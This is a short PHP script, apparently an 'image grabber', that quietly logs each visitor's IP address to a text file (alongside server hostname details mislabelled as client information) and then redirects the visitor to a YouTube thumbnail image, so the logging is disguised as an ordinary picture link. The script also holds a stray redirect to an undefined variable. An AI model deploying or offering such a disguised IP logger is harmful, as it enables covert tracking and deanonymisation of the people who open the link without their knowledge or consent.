<?php
file_put_contents("ImageGrabberIPAddress2.txt", "IP: " . $_SERVER['REMOTE_ADDR'] . "\nHostname: " . gethostname() . "\nClient Name: " . php_uname('n') . "\n===============\n",FILE_APPEND);

header('Location: '.$newURL);
header("Location: https://i.ytimg.com/vi/3aW6qQo6zlU/maxresdefault.jpg");
die();
?>